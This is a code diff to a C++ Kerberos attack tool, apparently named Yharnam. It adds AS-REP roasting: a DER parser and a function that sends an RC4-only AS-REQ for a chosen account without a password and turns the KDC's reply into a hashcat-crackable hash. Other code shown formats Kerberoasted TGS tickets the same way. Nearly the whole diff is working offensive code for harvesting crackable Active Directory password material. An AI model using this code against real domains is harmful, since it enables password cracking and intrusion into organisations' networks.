@@ -2,10 +2,13 @@
 #include <iostream>
 #include <stdexcept>
 #include <cctype>
+#include <cstdint>
 #include <cstring>
 #include <sstream>
 #include <iomanip>
 #include <algorithm>
+#include <vector>
+#include "protocols/KdcClient.h"
 
 namespace {
 // Encryption types Yharnam can extract a crackable hash for.
@@ -13,6 +16,121 @@ constexpr bool isSupportedEnctype(krb5_enctype etype) {
     return etype == ENCTYPE_AES128_CTS_HMAC_SHA1_96 ||
            etype == ENCTYPE_AES256_CTS_HMAC_SHA1_96 ||
            etype == ENCTYPE_ARCFOUR_HMAC;
+}
+
+// --- Minimal DER reader, just enough to walk an AS-REP / KRB-ERROR ---------
+// ASN.1 tags use single-byte identifiers here (tag numbers < 31).
+constexpr uint8_t kTagKrbError = 0x7e;  // [APPLICATION 30]
+constexpr uint8_t kTagAsRep    = 0x6b;  // [APPLICATION 11]
+constexpr uint8_t kTagSequence = 0x30;
+constexpr uint8_t kTagInteger  = 0x02;
+constexpr uint8_t kTagOctet    = 0x04;
+constexpr uint8_t kCtx0        = 0xa0;  // enc-part etype  [0]
+constexpr uint8_t kCtx2        = 0xa2;  // enc-part cipher [2]
+constexpr uint8_t kCtxEncPart  = 0xa6;  // KDC-REP enc-part [6]
+
+struct Tlv {
+    uint8_t tag = 0;
+    const uint8_t* val = nullptr;  // start of contents
+    size_t len = 0;                // length of contents
+    const uint8_t* next = nullptr; // first byte after this element
+};
+
+// Reads one tag-length-value triple starting at [p, end). Returns false on a
+// truncated or malformed element.
+bool readTlv(const uint8_t* p, const uint8_t* end, Tlv& out) {
+    if (p >= end) return false;
+    out.tag = *p++;
+    if (p >= end) return false;
+
+    size_t len = *p++;
+    if (len & 0x80) {  // long form
+        const int n = len & 0x7f;
+        if (n == 0 || n > 4 || p + n > end) return false;
+        len = 0;
+        for (int i = 0; i < n; ++i) len = (len << 8) | *p++;
+    }
+    if (len > static_cast<size_t>(end - p)) return false;
+
+    out.val = p;
+    out.len = len;
+    out.next = p + len;
+    return true;
+}
+
+struct AsRepEncPart {
+    bool ok = false;
+    bool kdcError = false;
+    krb5_enctype etype = 0;
+    const uint8_t* cipher = nullptr;
+    size_t cipherLen = 0;
+};
+
+// Reads the etype [0] and cipher [2] out of an EncryptedData SEQUENCE.
+bool parseEncryptedData(const Tlv& encPartField, AsRepEncPart& result) {
+    Tlv edSeq;
+    if (!readTlv(encPartField.val, encPartField.val + encPartField.len, edSeq) ||
+        edSeq.tag != kTagSequence) {
+        return false;
+    }
+
+    bool haveEtype = false;
+    for (const uint8_t* p = edSeq.val; ; ) {
+        Tlv field;
+        if (!readTlv(p, edSeq.val + edSeq.len, field)) break;
+        p = field.next;
+
+        if (field.tag == kCtx0) {  // etype [0] -> INTEGER
+            Tlv intVal;
+            if (readTlv(field.val, field.val + field.len, intVal) && intVal.tag == kTagInteger) {
+                krb5_enctype etype = 0;
+                for (size_t i = 0; i < intVal.len; ++i) etype = (etype << 8) | intVal.val[i];
+                result.etype = etype;
+                haveEtype = true;
+            }
+        } else if (field.tag == kCtx2) {  // cipher [2] -> OCTET STRING
+            Tlv octet;
+            if (readTlv(field.val, field.val + field.len, octet) && octet.tag == kTagOctet) {
+                result.cipher = octet.val;
+                result.cipherLen = octet.len;
+            }
+        }
+    }
+
+    return haveEtype && result.cipher != nullptr;
+}
+
+// Extracts the AS-REP enc-part (etype + cipher) from a raw KDC reply.
+AsRepEncPart parseAsRep(const uint8_t* data, size_t dataLen) {
+    AsRepEncPart result;
+    const uint8_t* end = data + dataLen;
+
+    Tlv outer;
+    if (!readTlv(data, end, outer)) return result;
+    if (outer.tag == kTagKrbError) {
+        result.kdcError = true;
+        return result;
+    }
+    if (outer.tag != kTagAsRep) return result;
+
+    Tlv seq;
+    if (!readTlv(outer.val, outer.val + outer.len, seq) || seq.tag != kTagSequence) {
+        return result;
+    }
+
+    // Walk the KDC-REP fields looking for enc-part [6].
+    for (const uint8_t* fp = seq.val; ; ) {
+        Tlv field;
+        if (!readTlv(fp, seq.val + seq.len, field)) break;
+        fp = field.next;
+
+        if (field.tag == kCtxEncPart) {
+            result.ok = parseEncryptedData(field, result);
+            break;
+        }
+    }
+
+    return result;
 }
 }  // namespace
 
@@ -122,15 +240,88 @@ std::string KerberosInteraction::requestAndFormatTGS(const std::string& spn, con
     
     if (retrievedCreds && retrievedCreds->ticket.length > 0) {
         std::string hashcat_ticket = KerberosTicketFormatter::formatTicket_TGS(
-            context_.get(), 
+            context_.get(),
             *retrievedCreds.get()
         );
         return hashcat_ticket;
     } else {
         std::cerr << "[-] Retrieved credentials structure is empty or has no ticket data" << std::endl;
     }
-    
+
     return "";
+}
+
+std::string KerberosInteraction::requestAndFormatASREP(
+    const std::string& username,
+    const std::string& realm,
+    const std::string& kdcHost
+) {
+    std::string upperRealm = realm;
+    std::transform(upperRealm.begin(), upperRealm.end(), upperRealm.begin(), ::toupper);
+
+    auto principal = parsePrincipal(username + "@" + upperRealm);
+    if (!principal) {
+        return "";
+    }
+
+    // Ask only for RC4-HMAC so the AS-REP yields the classic, hashcat-friendly
+    // (-m 18200) hash. Requires the account to have an RC4 key and the local
+    // krb5 to permit it (allow_weak_crypto = true).
+    krb5_get_init_creds_opt* options = nullptr;
+    if (krb5_get_init_creds_opt_alloc(context_.get(), &options)) {
+        return "";
+    }
+    krb5_enctype rc4Only[] = {ENCTYPE_ARCFOUR_HMAC};
+    krb5_get_init_creds_opt_set_etype_list(options, rc4Only, 1);
+
+    krb5_init_creds_context icc = nullptr;
+    krb5_error_code err = krb5_init_creds_init(
+        context_.get(), principal.get(), nullptr, nullptr, 0, options, &icc);
+    if (err) {
+        std::cerr << "[-] Failed to start AS-REQ for " << username << ": "
+                  << krb5_get_error_message(context_.get(), err) << std::endl;
+        krb5_get_init_creds_opt_free(context_.get(), options);
+        return "";
+    }
+
+    // First step (empty input) yields the AS-REQ bytes; we transport them
+    // ourselves and never feed the reply back, so no password is needed.
+    krb5_data in{};
+    krb5_data out{};
+    krb5_data realmData{};
+    unsigned int flags = 0;
+    err = krb5_init_creds_step(context_.get(), icc, &in, &out, &realmData, &flags);
+
+    std::string hash;
+    if (!err && out.length > 0) {
+        auto reply = KdcClient::exchange(
+            kdcHost, 88, reinterpret_cast<const uint8_t*>(out.data), out.length);
+
+        if (!reply) {
+            std::cerr << "[-] Could not reach KDC at " << kdcHost << ":88" << std::endl;
+        } else {
+            AsRepEncPart encPart = parseAsRep(reply->data(), reply->size());
+            if (encPart.kdcError) {
+                std::cerr << "[-] KDC rejected AS-REQ for " << username
+                          << " (pre-auth required, RC4 disabled, or unknown account)" << std::endl;
+            } else if (encPart.ok) {
+                hash = KerberosTicketFormatter::formatASREP(
+                    username, upperRealm, encPart.etype, encPart.cipher, encPart.cipherLen);
+            } else {
+                std::cerr << "[-] Could not parse AS-REP for " << username << std::endl;
+            }
+        }
+    } else if (err) {
+        std::cerr << "[-] Failed to build AS-REQ for " << username << ": "
+                  << krb5_get_error_message(context_.get(), err) << std::endl;
+    }
+
+    krb5_free_data_contents(context_.get(), &out);
+    krb5_free_data_contents(context_.get(), &realmData);
+    krb5_init_creds_free(context_.get(), icc);
+    krb5_get_init_creds_opt_free(context_.get(), options);
+
+    return hash;
 }
 
 std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> KerberosInteraction::parsePrincipal(
@@ -485,4 +676,24 @@ std::string KerberosTicketFormatter::buildASREPHash(
             << checksumHex << "$" << encDataHex;
 
     return ss_hash.str();
+}
+
+std::string KerberosTicketFormatter::formatASREP(
+    const std::string& username,
+    const std::string& realm,
+    krb5_enctype etype,
+    const unsigned char* cipher,
+    size_t cipherLen
+) {
+    const size_t checksumSize = getChecksumSize(etype);
+    if (checksumSize == 0 || cipherLen < checksumSize) {
+        std::cerr << "[-] Unsupported or truncated AS-REP cipher (etype " << etype << ")" << std::endl;
+        return "";
+    }
+
+    // For RC4-HMAC the 16-byte HMAC checksum precedes the encrypted data.
+    std::string checksumHex = to_hex(cipher, checksumSize);
+    std::string encDataHex = to_hex(cipher + checksumSize, cipherLen - checksumSize);
+
+    return buildASREPHash(username, realm, etype, checksumHex, encDataHex);
 }
